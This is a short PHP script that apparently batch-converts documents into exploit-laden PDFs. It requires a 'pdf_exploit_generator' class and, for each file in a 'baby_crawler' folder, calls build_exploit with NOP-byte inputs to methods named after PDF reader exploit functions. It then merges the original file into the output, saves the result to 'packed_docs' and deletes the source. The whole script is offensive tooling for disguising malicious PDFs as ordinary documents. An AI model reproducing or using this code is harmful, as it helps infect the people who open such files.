<?php 
require('pdf_exploit_generator.class.php');

function handleShutdown() {
        global $file;
        $error = error_get_last();
        if($error !== NULL){
                unlink($file);
        }
        else{
                unlink($file);
        }
    }

register_shutdown_function('handleShutdown');

$dir = "baby_crawler";
$dh  = opendir($dir);
while (false !== ($filename = readdir($dh))) {
        if($filename != "." &&  $filename != "..") {
        $file = $dir . "/" . $filename;
                echo "FILE: " . $file . "\n";

$pdf = new PDF_Exploit( 'P', 'mm', 'A4' );
$pdf->SetProtection(array('print'),'');
//$pdf->HelloWorld();
$pdf->addNewPlayer("\x90");
$pdf->addCollectEmailInfo("\x90");
$pdf->build_exploit();
//$pdf->setFiles(array('sample_docs/cats.pdf'));
$pdf->setFiles(array($file));
$pdf->concat();
$pdf->Output("packed_docs/".$filename,"F");
//$pdf->Output("cats.pdf","D");
unlink($file);
}
}
?>
